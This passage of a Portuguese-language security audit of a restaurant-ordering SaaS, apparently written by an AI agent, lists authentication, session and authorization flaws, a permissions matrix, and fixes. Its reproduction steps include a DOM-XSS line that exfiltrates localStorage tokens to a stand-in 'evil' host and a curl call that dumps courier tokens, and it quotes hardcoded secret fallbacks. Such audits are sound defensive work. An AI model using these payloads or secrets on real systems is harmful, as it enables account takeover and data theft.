- Vazamento: `delivery-persons/route.ts:22-27` devolve `...p` (inclui `token`) — e esta rota está sem `verifyAuth` (F1A-005) e exige só um token qualquer de outro tenant; `login/route.ts:74-83` devolve `deliveryPerson.token` no login (esperado).
- Revogação: `delivery-persons/[id]/route.ts:40-43` apenas marca `isActive: false` (o token continua existindo; `deliveries/route.ts:67-69` é que bloqueia por `isActive`); **não há endpoint que gere token novo**.
- Mass assignment: `delivery-persons/[id]/route.ts:17-21` — `data: body` cru → é possível enviar `{"token":"...","establishmentId":"<outro>","userId":...}`.
- Logout do app do motoboy: `delivery-page.tsx:126` — `localStorage.removeItem` (mesmo problema do F1A-010).

**Impacto no negócio** — Token é credencial permanente de um dispositivo pessoal; com F1A-005 ele vaza para qualquer visitante. Mass assignment permite "sequestrar" um motoboy para outro tenant ou fixar token conhecido.

**Como reproduzir** — `curl ".../api/delivery-persons?establishmentId=<id>"` → array com `token` de cada motoboy.

**Correção** — `verifyAuth` + tenant; usar `prisma.deliveryPerson.update({ data: { ...(body.isActive !== undefined && {isActive}) } })` (allowlist); trocar por token de 256 bits com `expiresAt` (ex. 30 dias) + endpoint `POST /api/delivery-persons/[id]/rotate-token`; retirar `token` de qualquer listagem.

**Esforço** — M.

---

### F1A-017 — MÉDIO — Sessão — Tokens de equipe em `localStorage`

**Evidência**
- `login/page.tsx:51-57` — grava `token` **e** `refreshToken` em `localStorage["pedefacil-user"]`; `cadastro/page.tsx:80-90` idem; `login/page.tsx:71-73` grava `kds_token`/`kds_user` em `localStorage`.
- `fetch-auth.ts:4-23,76-83` — lê de `localStorage` e envia em `Authorization`.
- Cookies criados mas **nunca lidos**: `cookies().set("auth_token", …)` (`login/route.ts:108-114`, `refresh/route.ts:50-56`) e `kds_token` (`kds-login/route.ts:46-52`); `grep "cookies().get"` só encontra `establishments/me/route.ts:9`, `establishments/[id]/{location,delivery-zones,delivery-config}/route.ts:9-10` e `saas-admin-auth.ts:17`. Nenhuma rota lê `kds_token` cookie; o middleware (desligado) só leria o header.
- Flags de todas com `httpOnly: true, sameSite: "lax", secure: NODE_ENV==="production", path: "/"` (`login/route.ts:109-113`, `refresh/route.ts:51-55`, `kds-login/route.ts:47-51`, `saas-admin/login/route.ts:49-53`).
- Fallback hardcoded: `establishments/me/route.ts:6`, `delivery-zones/route.ts:6`, `delivery-config/route.ts:10` — `process.env.JWT_SECRET || "flowos-secret"`; `saas-admin-auth.ts:6-8` e `saas-admin/login/route.ts:8-10` — `|| "flowoshub-saas-admin-secret-change-me"`.

**Impacto no negócio** — Qualquer XSS (e há 1.112 `any` + `menu-page.tsx` com 7.360 linhas) exfiltra access **e** refresh token → 7 dias de acesso indetectável. Criar cookie httpOnly e não usá-lo dá falsa sensação de proteção. Os fallbacks hardcoded viram segredo válido se a env faltar em algum ambiente (o `middleware.ts:5-7` era o único que falhava explícito — e está desligado).

**Como reproduzir** — Injetar `fetch("https://evil/?t="+localStorage.getItem("pedefacil-user"))` via DOM XSS.

**Correção** — Passar a usar o cookie `httpOnly` como fonte de verdade (middleware/route handlers leem cookie) e manter no cliente apenas metadados; eliminar todos os `|| "…secret"`; usar `process.env.JWT_SECRET!` com `if (!JWT_SECRET) throw`.

**Esforço** — M.

---

### F1A-018 — MÉDIO — Sessão — `isActive`/`role` não revalidados

**Evidência**
- `src/lib/auth.ts:13-41` — `verifyAuth` só faz `jwt.verify`; **nenhuma consulta ao banco**; checagem de tipo existe (`:22` rejeita `type === "refresh"` ✔).
- `login/route.ts:37` e `refresh/route.ts:30` são os únicos pontos que checam `isActive`.
- `refresh/route.ts:44-48` emite novo refresh token sem invalidar o anterior (sem rotação/armazenamento) → um roubo de refresh é re-utilizável até 7d e não gera detecção.
- Não há checagem de `establishmentId` no refresh (ok, pois vem do DB em `:38`).

**Impacto no negócio** — Desativar/demitir (`isActive=false`) **não** derruba a sessão ativa: o access token de 24h continua passando por `verifyAuth`. Idem para rebaixamento de papel: o `role`/`permissions` gravados no JWT valem até expirar (`login/route.ts:87`), o que agrava F1A-002 (auto-promoção persiste mesmo após correção, até 24h).

**Como reproduzir** — Logar, desativar a conta pelo admin, repetir a chamada no mesmo dia → 200.

**Correção** — Como F1A-010 (`tokenVersion` + `isActive` checados em `verifyAuth`) + rotação de refresh com `jti` armazenado e revogação do anterior.

**Esforço** — P.

---

### F1A-019 — MÉDIO — Caixa — `canCloseRegister` só esconde o botão

**Evidência**
- UI: `caixa/caixa-page.tsx:1150` — `{user?.canCloseRegister && (<button …Fechar Caixa>)}`; `caixa-page.tsx:327` exige permissão `caixa` para abrir a tela.
- Backend: `cash-register/[id]/route.ts:9-25` — `verifyAuth` + `register.establishmentId !== establishmentId` **e nada mais**; `:32-41` fecha o caixa.
- `cash-register/[id]/movements/route.ts:20-38` — qualquer autenticado do tenant cria movimentações.
- `cash-register/route.ts:16-40` — abrir caixa: **sem** `verifyAuth` (F1A-005).
- Única checagem real do sistema: `cash-register/[id]/transfer/route.ts:43`.
- Valor default: `prisma/schema.prisma:654` — `canCloseRegister Boolean @default(false)`.

**Impacto no negócio** — Controle de caixa (fechamento e conferência de divergência) é justamente o controle de fraude interna; hoje qualquer atendente fecha o caixa via API e registra movimentações arbitrárias.

**Correção** —
```ts
const u = await prisma.user.findUnique({ where: { id: authUser.userId }, select: { canCloseRegister: true, role: true } })
if (!u?.canCloseRegister && u.role !== "admin") return jsonError("Sem permissão para fechar o caixa", 403)
```
+ exigir `verifyAuth` em `cash-register/route.ts`.

**Esforço** — P.

---

### F1A-020 — MÉDIO — Cliente-final — OTP revelado na resposta

**Evidência** — `verification/route.ts:99` — `Math.floor(100000 + Math.random()*900000)`; `:261-267` — `devCode: code` é retornado **mesmo quando `whatsappSent: true`**; `:156` e `:250-257` — idem nos caminhos de fallback; `:243-246` — `SHOW_DEV_CODE === "true"` ou `?debug=1` expõe; `:138,:151,:186,:193,:237,:260` — `console.log` com o código; `:14` — `BYPASS_PHONES` fixos isentos dos limites de `:79,88,300`.
Contra-ataques positivos: código com hash bcrypt (`:100`), 3 tentativas (`:6,322-335`), 5 min (`:7`), cooldown/limites por número (`:64-90`).

**Impacto no negócio** — A "sessão" do cliente final (`menu-page.tsx:594,599` — `localStorage` `flowos-session-verified-<slug>`, **sem JWT**) é validada por um código que o servidor entrega ao próprio atacante na resposta HTTP: qualquer pessoa valida o telefone de qualquer cliente (e libera cupom de 1ª compra, `menu-page.tsx:601`). Nota: verificado junto com o F1A-001 — como o middleware não rota, `/api/verification` está mesmo acessível; se o middleware fosse religado sem ajuste, esta rota retornaria 401 e o login de cliente pararia (F1A-012).

**Correção** — remover `devCode` das respostas de produção (só em `NODE_ENV !== "production"`), trocar `Math.random` por `crypto.randomInt`, remover `console.log` do código, substituir `BYPASS_PHONES` por variável de ambiente e **emitir uma sessão assinada de cliente** (JWT curto com `{customerId, establishmentId, type:"customer"}`) em vez de flag de `localStorage`.

**Esforço** — M.

---

### F1A-021 — BAIXO — Cadastro — Vazamento de hash e `id` incorreto

**Evidência** — `establishments/route.ts:55-66` cria `Establishment` (campos completos) e `:103` `return NextResponse.json({ establishment, token, refreshToken })` → devolve o **hash bcrypt** da senha (`:35`) e todos os campos (incl. futuros segredos). Comparar com o GET, que filtra: `:130` e `:149` — `const { password, ...data } = establishment`. Token de cadastro com `permissions: ["admin"]` (`:92`) diverge das permissões gravadas no DB (`:75`). `cadastro/page.tsx:80-90` grava `id: data.establishment.id` (id do estabelecimento no lugar do id do usuário) e `permissions: ["admin"]`. `GET /api/establishments` sem `id`/`slug` lista todos os tenants ativos (`:153-159`).

**Impacto** — Exposição de hash (facilita offline cracking do dono), dados de sessão inconsistentes (quebra filtros que usam `user.id`, ex.: `caixa-page.tsx:2001`, `financeiro/caixa/page-content.tsx:86`), enumeração de tenants.

**Correção** — devolver `{ establishment: { id, name, slug }, token, refreshToken }` + `user` real; corrigir `id`/`permissions` no front; exigir auth para listagem completa de tenants.

**Esforço** — P.

---

### F1A-022 — BAIXO — Cron — Fail-open

**Evidência** — `cron/meta-quota/route.ts:10-11` — `if (cronSecret && authHeader !== ...)` (sem env → **sem checagem**); `cron/reset-ai-usage/route.ts:7` — `process.env.CRON_SECRET \|\| "dev-secret"` (segredo conhecido); `cron/sync-ifood-status/route.ts:62`, `cron/verify-reminder/route.ts:13`, `cron/sync-payments/route.ts:34` — `Bearer ${process.env.CRON_SECRET}` vira `"Bearer undefined"` se a env faltar. Todas estão em `PUBLIC_ROUTES` (`middleware.ts:20`), então dependem 100% desta checagem.

**Impacto** — Se `CRON_SECRET` não estiver na Vercel, qualquer um reseta uso de IA, dispara sync de iFood/pagamentos e lembretes de verificação (custo + spam de WhatsApp).

**Correção** — `if (!process.env.CRON_SECRET) return 500` (fail-closed) em todos; remover `|| "dev-secret"`.

**Esforço** — P. *(escopo se estende à fase de webhooks/cron)*

---

## MATRIZ DE PERMISSÕES (item 5)

**Perfis existentes no código:** `admin`, `atendente` (default, `prisma/schema.prisma:652`), `motoboy`, `kds`, `saas_admin` (`prisma/seed-admin.ts:16,30`).
→ **Não existem** `gerente`, `dono` nem `cozinha` (grep negativo; `cozinha` aparece só como rótulo `"Cozinha (KDS)"` em `usuarios/page-content.tsx:31,47`).
**Permissões existentes** (`usuarios/page-content.tsx:13-25`): `dashboard, caixa, pedidos, clientes, cardapio, estoque, entregas, financeiro, relatorios, config, usuarios`. Default `["caixa"]` (`prisma/schema.prisma:653`). Atenção: `transfer` checa `permissions.includes("admin")` (`cash-register/[id]/transfer/route.ts:43`) mas **`"admin"` não está na lista de permissões** — quem tem o papel `admin` só passa porque recebe `config` (`usuarios/page-content.tsx:90-91`, `establishments/route.ts:75`).

**Observação estrutural:** o único gate real do front é `dashboard/(auth)/layout.tsx:84` (redireciona para `/login` se `role !== "admin" && !permissions.includes("caixa") && permissions.length <= 1`) e os filtros de menu em `:133,239,249,262,279,295,307,323,338`. **As páginas em si não têm guarda** — `/dashboard/usuarios`, `/dashboard/config`, `/dashboard/financeiro` abrem direto pela URL para qualquer usuário logado.

| Perfil | Ação | Módulo | UI esconde? | Backend bloqueia? | Evidência |
|---|---|---|---|---|---|
| atendente (só `caixa`) | Ver KPIs/receita | Dashboard | Sim (item de menu) | **Não** | UI `layout.tsx:133`; API `dashboard/route.ts:20-29` (sem auth) |
| atendente | Fechar caixa | PDV | Sim (`canCloseRegister`) | **Não** | UI `caixa-page.tsx:1150`; API `cash-register/[id]/route.ts:9-25` |
| atendente | Transferir caixa | PDV | Não | **Sim** ✔ | `cash-register/[id]/transfer/route.ts:43` |
| atendente | Operar PDV (abrir caixa, movimentar) | PDV | Sim (`caixa` perm) | **Não** | UI `caixa-page.tsx:327`; API `cash-register/route.ts:16-40` (sem auth), `movements/route.ts:20-38` |
| atendente | Ler DRE/fluxo de caixa | Financeiro | Sim (`relatorios`) | **Não** | UI `layout.tsx:262,279`; API `financial/dre/route.ts:5,16` (sem auth) |
| atendente | Criar/editar despesas | Financeiro | Sim (menu) | **Não** | UI `layout.tsx:262`; API `expenses/route.ts:116-124` (sem auth) |
| atendente | CRUD de usuários | Usuários | Sim (`usuarios` perm) | **Não** | UI `layout.tsx:323,338`; API `users/route.ts:40-46`, `users/[id]/route.ts:11-32` (só tenant) |
| atendente | **Promover-se a admin / dar permissões** | Usuários | Sim (form só via menu) | **Não** | UI `usuarios/page-content.tsx:363`; API `users/[id]/route.ts:26-27` |
| atendente | Ler/gravar segredos (Asaas, Meta, WhatsApp) | Configurações | Sim (`config` perm) | **Não** | UI `layout.tsx:323`; API `establishments/[id]/route.ts:38,71-78` |
| atendente | CRUD de cardápio/estoque/fornecedores | Cardápio/Estoque | Sim (`cardapio`/`estoque`) | **Não** | UI `layout.tsx:17,18`; API `categories/route.ts:32-42`, `stock/route.ts:44+`, `suppliers/route.ts:25-70` (sem auth) |
| atendente | Apagar **todos** os pedidos | Pedidos | Sim (sem botão) | **Não** | API `orders/delete-all/route.ts:7-16` (só tenant) |
| atendente | Criar/editar banners e stories | Destaques | Não (rota fora do nav, acessível por URL) | **Não** | `admin/banners/route.ts:9-29,28-45` (só tenant) |
| atendente (ou anônimo) | Listar/editar clientes de **outro** tenant | Clientes | Sim (`clientes` perm) | **Não** | UI `layout.tsx:19`; API `customers/route.ts:15-49,65-151` (sem auth) |
| kds | Alterar status de pedido | KDS/Pedidos | Sim (`kds/(auth)/layout.tsx:22,34`) | **Não** | `orders/[id]/route.ts:15,34-37` — qualquer autenticado do tenant |
| kds | Ver/atualizar pedidos (API) | KDS | Sim | **Não** | Mesmo; nenhum filtro por `role === "kds"` na API |
| kds | Acessar dashboard/usuarios | Dashboard | **Sim, bloqueia página** (redirect) | **Não** | UI `layout.tsx:84`; API `users/route.ts:7-10` |
| motoboy | Ver/atualizar entregas | Entregas | Sim (URL `/{slug}/entregas/{token}`) | Sim (por `token` de dispositivo) | `delivery-persons/deliveries/route.ts:8-21,58-76` |
| motoboy | Criar usuário em outro tenant | Usuários | Não | **Não** | `delivery-persons/route.ts:30-53` (sem auth) |
| admin | Todas as ações acima | Todas | Não (vê tudo) | Não (mesmo teto que os demais) | — |
| admin | Gerenciar `saas_admin`/plataforma | SaaS | Não | **Sim** ✔ (`role === "saas_admin"` no JWT) | `saas-admin-auth.ts:22` |
| qualquer logado | Obter `role: "saas_admin"` | SaaS | Não | **Não** | `users/route.ts:68` + `saas-admin/login/route.ts:25-46` |
| cliente-final/anônimo | Dump de pedidos + `trackingToken` | Pedidos | n/a | **Não** | `orders/route.ts:690-757` |
| cliente-final/anônimo | PII de clientes | Clientes | n/a | **Não** | `customers/route.ts:15-49` |
| anônimo | Ler dashboard/financeiro/caixa/estoque de qualquer tenant | Todos | n/a | **Não** | `dashboard/route.ts:20-29`, `financial/*`, `cash-register/route.ts` |

**Ações que dependem SÓ de esconder o botão** (backend nunca bloqueia): fechar caixa; operar/abrir caixa e movimentar; ver financeiro (DRE/receitas/fluxo/CMV); criar despesas; CRUD de usuários; **auto-promover papel/permissões**; ler e trocar chaves de pagamento e tokens Meta/WhatsApp; CRUD de cardápio/estoque/fornecedores/categorias; apagar todos os pedidos; banners/stories; listar/editar clientes de outro tenant; alterar status de pedido como KDS; acessar páginas `/dashboard/usuarios`, `/dashboard/config`, `/dashboard/financeiro` por URL.

---

## Respostas diretas às perguntas da fase

**1. Fluxo completo**
- **Cadastro** (`establishments/route.ts:12-108`): valida presença + `length < 6` (`:16-22`), unicidade de e-mail (`:24-27`) e slug (`:29-33`), cria `Establishment` com trial 7d (`:37-38,55-66`), cria `User` com `role: "admin"` e 11 permissões (`:69-78`), cria categoria+2 produtos (`:80-89`), emite access 24h (`:91-95`) e refresh 7d (`:97-101`). Devolve o objeto `establishment` completo com hash (F1A-021). Não há verificação de e-mail (F1A-013).
- **Login** (`login/route.ts:22-136`): rate limit 15/min (`:30-34`), busca user (`:36`), rejeita inativo (`:37`), rejeita `saas_admin` antes da senha (`:42`), exige `establishmentId` (`:49`), `bcrypt.compare` (`:53`), **reseta o rate limit no sucesso** (`:58`), carrega establishment (`:60-69`), monta `permissions` do JSON (`:71`), devolve `deliveryPerson.token` p/ motoboy (`:73-84`), assina access 24h (`:86-90`) e refresh 7d (`:92-96`), seta cookie `auth_token` 24h httpOnly (`:108-114`) e devolve `token`+`refreshToken` no body (`:116-131`).
- **Refresh** (`refresh/route.ts:8-66`): verifica assinatura com `JWT_SECRET + "-refresh"` (`:19`), revalida `isActive` (`:30`), **não tem rotação** (`:44-48`), re-emite access 24h e seta cookie (`:37-56`). Sem rate limit.
- **Recuperação de senha**: `forgot` gera `crypto.randomBytes(32)` com 1h de validade (`forgot/route.ts:27-42`), devolve mensagem genérica anti-enumeration (`:19-24,56-58`) e **só imprime o link em `console.log`** (`:46-47`, e-mail comentado em `:49-54`) → **o fluxo por e-mail não funciona**; `reset` valida uso/expiração (`reset/route.ts:27-33`), hash 12 (`:36`), limpa `mustChangePassword` (`:43`) e marca `used` (`:48-51`). `change-password` (`auth/change-password/route.ts:8-49`) exige sessão + senha atual + `length >= 6`.
- **Convite/criação de funcionário** (`users/route.ts:38-91`): exige sessão (`:40-43`), força tenant (`:54`), hash 10 (`:61`), aceita `role`/`permissions` livres (`:68-69`), `mustChangePassword: true` (`:71`). Front usa `123456` como default (`usuarios/page-content.tsx:82`). **Não há e-mail de convite** — a senha é repassada manualmente.
- **Logout**: **não existe logout efetivo.** Só `localStorage.removeItem` (`dashboard/(auth)/layout.tsx:136-139`, `caixa-page.tsx:1082-1085`, `kds/(auth)/screen/page.tsx:159`, `fetch-auth.ts:37-41`) — cookies `auth_token`/`kds_token` nunca são apagados e nenhum token é revogado (F1A-010). Único logout server-side: `saas-admin/logout/route.ts:5`.
- **Expiração**: access 24h (3 emissores), refresh 7d, cookie 24h, reset 1h, OTP 5min. Sem rotação/denylist.

**2. Política de senha** — ver F1A-014 (tabela com todas as linhas de comparação). `mustChangePassword`: definido em `users/route.ts:71` e `delivery-persons/route.ts:50`; **usado apenas no front** (`login/page.tsx:45-49`), pois o token já foi emitido (`login/route.ts:86-114`).

**3. Força bruta** — ver F1A-007 (tabela completa dos 11 endpoints sensíveis). O `Map` de `rate-limit.ts:6` **não sobrevive a cold start nem é compartilhado entre instâncias serverless**; a chave é por IP (`login/route.ts:30`), com reset por IP no sucesso (`:58`) — **não há limite por conta/e-mail**.

**4. MFA** — **não existe** (grep negativo total: `mfa|totp|2fa|speakeasy|otplib|authenticator`). Verificação de e-mail no cadastro: **não existe** (grep negativo: `emailVerified|isEmailVerified|verifyEmail`). O OTP existente é do cliente final por WhatsApp e não protege contas de equipe.

**5. Matriz** — tabela acima.

**6. Escalonamento** — ver F1A-002/F1A-003. `PATCH /api/users/[id]` valida **apenas**: (a) token válido (`:11-14`), (b) usuário-alvo pertence ao mesmo tenant (`:16-19`). Depois copia cegamente `name/email/role/permissions/isActive/canCloseRegister/password` (`:24-32`). **Não** valida papel do chamador, **não** impede auto-alteração, **não** valida senha mínima, **não** checa último admin. `establishmentId` **não** é alterável por essa rota (não está em `data`) — e os únicos `prisma.user.update` do projeto são `auth/reset:39`, `auth/change-password:43`, `users/[id]:34`, `users/change-password:37` (nenhum mexe em `establishmentId`) → **não** há como mover usuário de tenant por essa via; o vetor real de cross-tenant é `POST /api/delivery-persons` (`:43-53`). Usuário de um tenant **consegue** criar usuário em outro tenant: sim, por lá (F1A-003) — via `/api/users` é bloqueado (`users/route.ts:52-54,72`).

**7. Autenticação de dispositivos**
- **KDS** (`auth/kds-login/route.ts`): qualquer conta com `role === "kds"` (`:22`), sem rate limit, sem checagem de establishment antes da senha; token 24h (`:40-44`) gravado em cookie httpOnly (`:46-52`) **e** em `localStorage` (`login/page.tsx:71`, `kds/page.tsx:33`); a tela aceita também o token de `admin` (`kds/(auth)/layout.tsx:34`). **Não revogável** (JWT stateless, sem denylist) — só expira.
- **Motoboy**: `deliveryPerson.token` = `randomBytes(8)` hex (`delivery-persons/route.ts:37`), **não expira, não rotaciona**, credencial permanente; revogação parcial apenas via `isActive:false` (`delivery-persons/[id]/route.ts:40-43`) ou delete (que só desativa, `:40-43`). Vazado em listagem anônima (F1A-005/F1A-016). O app não tem logout real (`delivery-page.tsx:126`).
- **PDV (`/caixa`)**: autentica com `localStorage["pedefacil-user"]` (`caixa-page.tsx:321-330`), exige `permissions.includes("caixa")` **só no cliente** (`:327`); o backend do caixa só exige token + tenant (`cash-register/[id]/route.ts:9-25`) — e `POST /api/cash-register` não exige nada (`route.ts:16`).

**8. Separacão cliente-final × equipe** — **Sistemas distintos: o cliente final não recebe JWT algum.** A "sessão" é a flag `localStorage` `flowos-session-verified-<slug>` (`menu-page.tsx:594,599,629`), gravada após `PUT /api/verification` (`:560-580,2620-2638`) ou por link (`?code=&phone=`); nenhum `jwt.sign`/`SignJWT` emite token para cliente (grep: os 8 pontos de emissão são `establishments/route.ts:91,97`, `login/route.ts:86,92`, `refresh/route.ts:37,44`, `kds-login/route.ts:40`, `saas-admin/login/route.ts:38` — todos de equipe). Portanto **um cliente final não consegue obter token com `establishmentId`+`userId` de equipe** por esse caminho. Porém, por F1A-001/004/011 ele sequer precisa de token para ler pedidos (com `trackingToken`), PII e adulterar dados — a separação está rompida no sentido oposto. O `trackingToken` por pedido (`orders/route.ts:170`, `:433`) funciona como credencial de cliente e é entregue sem qualquer verificação de identidade. Correção sugerida: emitir JWT de cliente (`type: "customer"`, com `customerId`+`establishmentId`) e exigir `Authorization` nas rotas de cliente.

**9. Cookies** — 5 cookies setados, **todos** `httpOnly: true`, `sameSite: "lax"`, `secure: process.env.NODE_ENV === "production"`, `path: "/"`: `auth_token` (`login/route.ts:108-114`, `refresh/route.ts:50-56`), `kds_token` (`kds-login/route.ts:46-52`), `saas_admin_token` (`saas-admin/login/route.ts:48-54`). Nenhum `document.cookie` no código. Problemas: (a) `auth_token`/`kds_token` nunca são **lidos** (F1A-017); (b) nenhum é apagado no logout (F1A-010); (c) a sessão real vive em `localStorage` (F1A-017). Nenhum cookie é setado fora dessas 5 rotas.

**10. Logout** — `grep "logout|signOut|cookies().delete"`: `dashboard/(auth)/layout.tsx:136-139`, `caixa/caixa-page.tsx:1082-1085`, `kds/(auth)/screen/page.tsx:159`, `delivery-page.tsx:126`, `fetch-auth.ts:37-41`, `admin-saas/(auth)/layout.tsx:60` (form → `saas-admin/logout`), `api/saas-admin/logout/route.ts:5`. **Conclusão: para a equipe da loja o token não é invalidado no servidor — só é removido do cliente**; access e refresh seguem válidos 24h/7d e os cookies httpOnly permanecem no navegador até expirar naturalmente.

---

## O que está bom

- `users/route.ts:52-54,72` — isolamento de tenant **forçado** no `POST /api/users` (hotfix `aae4530`) e checagem idem no `GET` (`:15-18`).
- `users/[id]/route.ts:16-19,66-69` — alvo sempre comparado com `establishmentId` do token (não há cross-tenant nessa rota).
- `orders/[id]/route.ts:28-44` — desenho de autorização explicitamente documentado e com `trackingToken` restrito a cancelamento com pagamento pendente.
- `orders/[id]/messages/route.ts:15-31` e `payment-status` (hotfix) — token de rastreamento obrigatório.
- `establishments/route.ts:130,149` e `saas-admin` — remoção de `password` em respostas; `webhooks/asaas/route.ts:11-20` com `timingSafeEqual`.
- `forgot/route.ts:19-24` — resposta genérica evita enumeração por e-mail; token de reset forte (`randomBytes(32)`), 1h, single-use, hash no DB.
- `verification` — código com hash bcrypt, 3 tentativas, 5 min, cooldown/limites persistidos em banco (sobrevive a cold start, ao contrário do rate limit de login).
- `auth.ts:22` — rejeita refresh token usado como access token (e assinaturas distintas impedem o inverso).
- Cookies com flags corretas (httpOnly/secure/sameSite) nos 5 pontos de emissão.
- `middleware.ts:5-7` — recusa-se a rodar sem `JWT_SECRET` (removido o fallback hardcoded do hotfix) — embora o arquivo esteja fora do build, a intenção é a correta.
- `upload/route.ts:9-22` — allowlist de MIME e `verifyAuth`.
- `kds-login` exige papel específico (`:22`) — a checagem existe, só está na ordem errada.

---

## NÃO VERIFICADO

- **Comportamento em runtime na Vercel** — não executei nada (sem `curl`, sem `next build`, sem deploy). A conclusão do F1A-001 é estática+determinística (código do Next + manifest local), mas não confirmei a resposta HTTP do ambiente de produção.
- **Estado real do banco** (papéis existentes, `saas_admin` ativos, senhas fracas) — `DATABASE_URL` é produção; não consultei. Também não verifiquei se existem usuários fora dos 5 papéis do código.
- **Spoofabilidade de `x-forwarded-for`** na Vercel para burlar o rate limit — depende do comportamento do proxy da plataforma; não testado.
- **`CRON_SECRET`, `ASAAS_WEBHOOK_TOKEN`, `JWT_SECRET`** — não li `.env` (segredo); o F1A-022 assume apenas o cenário de ausência.
- **Webhooks de pagamento/WhatsApp e iFood/99** — fase própria (assinatura, replay, idempotência): parcialmente coberto pelo hotfix `aae4530`, não auditado aqui.
- **Endpoints de pedidos, catálogo, cupons e pagamentos** (fases seguintes) — verifiquei apenas o quanto afetam separação cliente × equipe; não auditei lógica de preço/desconto.
- **`/api/coupons/validate`** — chamado por `menu-page.tsx:1864` mas **não existe** `src/app/api/coupons/` → 404; feature possivelmente quebrada, não investigado.
- **Testes automatizados da camada de auth** — `vitest` cobre só 6 arquivos (nota da auditoria de qualidade); não rodei a suíte.

---

## Top 5 ações imediatas

1. **Religar o perímetro com validação** — mover `middleware.ts` → `src/middleware.ts`, **antes** disso revisar `PUBLIC_ROUTES` (F1A-012) e adicionar gate de CI que falha se `.next/server/middleware-manifest.json` vier vazio (F1A-001). Sem isso, todo o resto é contorno.
2. **Fechar escalonamento de privilégio e tenant** (1 dia): allowlist de `role`/`permissions` em `PATCH/POST /api/users`; proibir auto-alteração de papel; exigir `verifyAuth` + `establishmentId` do token em `POST /api/delivery-persons`; bloquear `role: "saas_admin"` em usuários com tenant; allowlist no `data: body` de `delivery-persons/[id]` (F1A-002/003/016).
3. **Exigir autenticação + tenant em toda rota que lê `establishmentId`** — prioridade: `GET /api/orders` (remover `trackingToken` do payload), `dashboard`, `financial/*`, `cash-register`, `categories`, `stock`, `expenses`, `suppliers`, `customers`, `delivery-persons` (F1A-004/005/011).
4. **Rate limit distribuído (Upstash/DB)** em `saas-admin/login`, `kds-login`, `forgot`, `reset`, `refresh`, `users/change-password` + corrigir o `if (user)` de `users/change-password:18-23` e a enumeração por `403` pré-bcrypt nos 3 logins (F1A-006/007/015).
5. **Sessão revogável**: `tokenVersion`/`isActive` checados em `verifyAuth`, `POST /api/auth/logout` que o incrementa (invalida access+refresh), remover tokens de `localStorage`, não emitir token com `mustChangePassword` e política de senha única de 8+ caracteres substituindo os defaults `123456` (F1A-010/014/017/018).
</task_result>
</task>